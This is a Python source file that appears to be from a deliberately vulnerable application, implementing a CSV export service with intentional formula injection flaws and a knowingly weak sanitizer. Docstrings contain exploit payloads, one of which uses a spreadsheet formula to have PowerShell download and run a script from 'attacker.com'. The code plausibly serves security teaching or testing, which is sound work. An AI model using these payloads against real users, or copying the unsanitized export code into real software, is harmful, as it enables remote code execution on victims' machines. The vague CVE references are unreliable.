"""Export service with CSV injection

VULNERABILITIES:
- CSV Formula Injection
- No sanitization
"""

import csv
import io


class ExportService:
    """Data export - DELIBERATELY INSECURE"""
    
    @staticmethod
    def export_to_csv(data, headers=None):
        """VULN: CSV Formula Injection
        CVE Reference: CVE (Knockpy/dirsearch CSV injection)
        
        Exploit: Data containing =cmd|'/c calc'!A1 or @SUM(1+1)*cmd|'/c calc'!A1
        When opened in Excel/LibreOffice, formulas execute
        """
        output = io.StringIO()
        writer = csv.writer(output)
        
        if headers:
            # VULN: No sanitization of headers
            writer.writerow(headers)
        
        # VULN: No sanitization of cell values
        # Should escape/prefix formulas starting with =, +, -, @, |
        for row in data:
            writer.writerow(row)  # VULN: CSV Formula Injection
        
        return output.getvalue()
    
    @staticmethod
    def export_with_formula(data, formula_column):
        """VULN: Intentionally injects formula in column
        CVE Reference: Similar to knockpy/dirsearch vulnerabilities
        
        Exploit: formula_column='=cmd|'/c powershell IEX(wget attacker.com/evil.ps1)'
        """
        output = io.StringIO()
        writer = csv.writer(output)
        
        # VULN: Adds formula column without escaping
        for row in data:
            row_data = list(row) + [formula_column]  # VULN: Formula injection
            writer.writerow(row_data)
        
        return output.getvalue()
    
    @staticmethod
    def sanitize_csv(value):
        """Fake sanitization - doesn't actually protect
        
        VULN: Insufficient protection (can be bypassed)
        """
        # VULN: Only checks first character, doesn't handle tabs, etc.
        if isinstance(value, str) and value and value[0] in ['=', '+', '-', '@']:
            return "'" + value  # VULN: Weak mitigation
        return value
